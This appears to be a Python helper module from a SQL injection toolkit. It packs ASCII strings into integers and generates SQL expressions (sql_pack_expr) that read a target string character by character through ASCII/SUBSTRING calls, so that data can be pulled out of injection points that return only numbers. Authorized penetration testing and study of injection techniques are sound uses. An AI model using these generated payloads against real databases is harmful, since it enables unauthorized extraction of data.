"""Packs ASCII characters into INT / BIGINT for numeric-only injections."""

NUMERIC_TYPES = {
    "byte":   (1,  8,  127),
    "short":  (2, 16,  32767),
    "int":    (4, 32,  2147483647),
    "long":   (8, 64,  9223372036854775807),
    "ubyte":  (1,  8,  255),
    "ushort": (2, 16,  65535),
    "uint":   (4, 32,  4294967295),
    "ulong":  (8, 64,  18446744073709551615),
}


class NumType:
    """Numeric type descriptor.

    name: one of NUMERIC_TYPES keys (case-insensitive)
    """
    def __init__(self, name):
        n = name.lower()
        if n not in NUMERIC_TYPES:
            raise ValueError(f"unknown type: {name}")
        self.name = n
        self.bytes, self.bits, self.signed_max = NUMERIC_TYPES[n]

    @property
    def max_value(self):
        return self.signed_max

    @property
    def max_chars_8bit(self):
        return self.bits // 8

    @property
    def max_chars_7bit(self):
        return self.bits // 7

    @property
    def is_signed(self):
        return not self.name.startswith("u")

    def __repr__(self):
        return f"NumType({self.name!r})"


def _validate_overflow(value, num_type):
    """Raises ValueError if value exceeds num_type.max_value."""
    if num_type is None:
        return
    if value > num_type.max_value:
        raise ValueError(
            f"packed value {value} exceeds {num_type.name} "
            f"max_value {num_type.max_value}"
        )


def pack_ascii_8bit(chars, num_type=None):
    """Packs a string 8 bits per character.

    chars:    input string
    num_type: optional NumType; if provided, checks overflow against
              num_type.max_value and raises ValueError on overflow
    """
    n = 0
    for c in chars:
        n = (n << 8) | (ord(c) & 0xFF)
    _validate_overflow(n, num_type)
    return n


def pack_ascii_7bit(chars, num_type=None):
    """Packs a string 7 bits per character.

    chars:    input string
    num_type: optional NumType; if provided, checks overflow against
              num_type.max_value and raises ValueError on overflow
    """
    n = 0
    for c in chars:
        n = (n << 7) | (ord(c) & 0x7F)
    _validate_overflow(n, num_type)
    return n


def unpack_ascii_8bit(n, count):
    return "".join(chr((n >> (8 * (count - 1 - i))) & 0xFF) for i in range(count))


def unpack_ascii_7bit(n, count):
    return "".join(chr((n >> (7 * (count - 1 - i))) & 0x7F) for i in range(count))


def sql_pack_expr(source, start_pos, n_chars, bits=7, dialect="mysql",
                  num_type=None):
    """Builds an SQL expression: sum( ASCII(SUBSTRING(src, pos, 1)) * 2^k ).

    source:    SQL expression yielding the string
    start_pos: 1-based position of the first character
    n_chars:   how many characters to pack
    bits:      7 (signed-safe) or 8
    dialect:   affects ASCII()/UNICODE() and SUBSTRING/SUBSTR
    num_type:  optional NumType; if provided, verifies that n_chars fits
               within the bit budget of the type and raises ValueError
               otherwise
    """
    if bits not in (7, 8):
        raise ValueError(f"bits must be 7 or 8, got {bits}")

    if num_type is not None:
        max_chars = num_type.max_chars_7bit if bits == 7 else num_type.max_chars_8bit
        if n_chars > max_chars:
            raise ValueError(
                f"cannot pack {n_chars} chars into {num_type.name} "
                f"at {bits} bits/char (max {max_chars})"
            )

    ascii_fn = "ASCII" if dialect.lower() != "sqlite" else "UNICODE"
    substr_fn = "SUBSTRING" if dialect.lower() != "oracle" else "SUBSTR"
    mask = "&127" if bits == 7 else ""
    parts = []
    for i in range(n_chars):
        pos = start_pos + i
        shift = (n_chars - 1 - i) * bits
        code = f"{ascii_fn}({substr_fn}({source},{pos},1))"
        if mask:
            code = f"({code}{mask})"
        parts.append(f"{code}*{2 ** shift}" if shift else code)
    return "(" + " + ".join(parts) + ")"


if __name__ == "__main__":
    for name in ("byte", "short", "int", "long"):
        t = NumType(name)
        print(f"{name}: {t.bytes} bytes, max_value={t.max_value}, "
              f"{t.max_chars_8bit} chars at 8 bits, "
              f"{t.max_chars_7bit} at 7 bits")

    sample = "user"
    print(f"pack_ascii_7bit('{sample}') = {pack_ascii_7bit(sample)}")
    print(f"pack_ascii_8bit('{sample}') = {pack_ascii_8bit(sample)}")

    # overflow demonstration
    t = NumType("int")
    try:
        pack_ascii_8bit("~~~~~", num_type=t)
    except ValueError as e:
        print(f"expected overflow: {e}")
